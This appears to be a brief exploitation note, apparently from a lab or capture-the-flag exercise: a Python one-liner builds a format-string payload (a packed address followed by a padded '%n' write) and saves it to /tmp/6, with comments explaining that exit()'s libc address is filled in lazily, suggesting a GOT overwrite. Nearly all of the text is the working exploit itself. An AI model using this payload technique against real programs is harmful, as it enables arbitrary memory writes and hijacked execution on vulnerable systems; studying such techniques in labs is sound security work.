python -c 'import struct; import sys; sys.stdout.write(struct.pack("<I", 0x08049838) + "%134513824d" + "%4$n")' > /tmp/6
#Lazy Binding
#The real libc address is filled in only when exit() is first called.
